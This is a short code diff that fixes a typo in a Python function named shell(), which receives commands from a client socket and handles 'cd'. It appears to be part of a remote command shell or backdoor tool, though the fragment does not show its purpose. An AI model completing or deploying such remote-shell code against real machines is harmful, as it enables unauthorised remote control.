@@ -10,7 +10,7 @@ SEP = "<sep>"
 
 
 def shell():
-	command=client_socketnt_socket.recv(BUFFER).decode()
+	command=client_socket.recv(BUFFER).decode()
 	splited_command = command.split()
 
 	if splited_command[0].lower() == "cd":
